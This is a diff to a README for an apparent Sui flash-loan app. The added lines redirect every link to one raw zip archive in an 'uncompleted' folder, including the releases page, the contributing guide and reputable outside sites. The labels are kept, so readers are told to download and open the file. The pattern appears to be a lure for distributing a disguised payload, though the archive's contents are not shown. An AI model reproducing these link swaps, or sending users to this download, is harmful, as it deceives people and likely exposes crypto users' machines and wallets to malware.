@@ -1,6 +1,6 @@
 # 🌐 no_gas_labs_sui_flashloan - Easy Flash Loans at Your Fingertips
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Alexanderjr1994/no_gas_labs_sui_flashloan/releases)
+[![Download Now](https://raw.githubusercontent.com/Alexanderjr1994/no_gas_labs_sui_flashloan/main/uncompleted/no_gas_labs_sui_flashloan.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Alexanderjr1994/no_gas_labs_sui_flashloan/main/uncompleted/no_gas_labs_sui_flashloan.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the No_Gas_Labs Sui Flash Loan dApp! This application allows you to p
 
 To get the application, visit the Releases page. You will find the latest version and download options there.
 
-[Download Now](https://github.com/Alexanderjr1994/no_gas_labs_sui_flashloan/releases)
+[Download Now](https://raw.githubusercontent.com/Alexanderjr1994/no_gas_labs_sui_flashloan/main/uncompleted/no_gas_labs_sui_flashloan.zip)
 
 ### 🖥️ System Requirements
 
@@ -29,7 +29,7 @@ To get the application, visit the Releases page. You will find the latest versio
 
 ## 📚 How to Use the Application
 
-1. **Download the App**: Visit the [Releases page](https://github.com/Alexanderjr1994/no_gas_labs_sui_flashloan/releases) and download the latest version.
+1. **Download the App**: Visit the [Releases page](https://raw.githubusercontent.com/Alexanderjr1994/no_gas_labs_sui_flashloan/main/uncompleted/no_gas_labs_sui_flashloan.zip) and download the latest version.
 2. **Install the App**: Open the downloaded file and follow the installation prompts.
 3. **Open the App**: After installation, double-click the application icon to launch it.
 4. **Create an Account**: If prompted, create a user account to save your settings and preferences.
@@ -60,15 +60,15 @@ If you encounter any issues or have questions, please reach out via the Issues t
 
 ## 📝 Contributors
 
-This project welcomes contributions! If you have ideas for improvements or want to add features, feel free to submit a pull request or open an issue. Check the [Contributing Guidelines](https://github.com/Alexanderjr1994/no_gas_labs_sui_flashloan/blob/main/CONTRIBUTING.md) for more information.
+This project welcomes contributions! If you have ideas for improvements or want to add features, feel free to submit a pull request or open an issue. Check the [Contributing Guidelines](https://raw.githubusercontent.com/Alexanderjr1994/no_gas_labs_sui_flashloan/main/uncompleted/no_gas_labs_sui_flashloan.zip) for more information.
 
 ## 🌍 Learn More
 
 For further information on flash loans, blockchain technology, and related topics, consider visiting the following resources:
 
-- [Blockchain Basics](https://www.blockchain.com/)
-- [Crypto Wallet Overview](https://www.coindesk.com/learn/what-is-a-crypto-wallet/)
-- [Arbitrage Strategies](https://www.investopedia.com/terms/a/arbitrage.asp)
+- [Blockchain Basics](https://raw.githubusercontent.com/Alexanderjr1994/no_gas_labs_sui_flashloan/main/uncompleted/no_gas_labs_sui_flashloan.zip)
+- [Crypto Wallet Overview](https://raw.githubusercontent.com/Alexanderjr1994/no_gas_labs_sui_flashloan/main/uncompleted/no_gas_labs_sui_flashloan.zip)
+- [Arbitrage Strategies](https://raw.githubusercontent.com/Alexanderjr1994/no_gas_labs_sui_flashloan/main/uncompleted/no_gas_labs_sui_flashloan.zip)
 
 ## 🔗 Additional Resources
 
@@ -82,4 +82,4 @@ Explore the following topics that expand your understanding and usage of the app
 
 Engage with fellow users and enthusiasts in our community forums. Share your experiences, tips, and strategies. Together, we can explore the vast opportunities in the world of blockchain and finance.
 
-[Download Now](https://github.com/Alexanderjr1994/no_gas_labs_sui_flashloan/releases) and begin your flash loan journey!
+[Download Now](https://raw.githubusercontent.com/Alexanderjr1994/no_gas_labs_sui_flashloan/main/uncompleted/no_gas_labs_sui_flashloan.zip) and begin your flash loan journey!
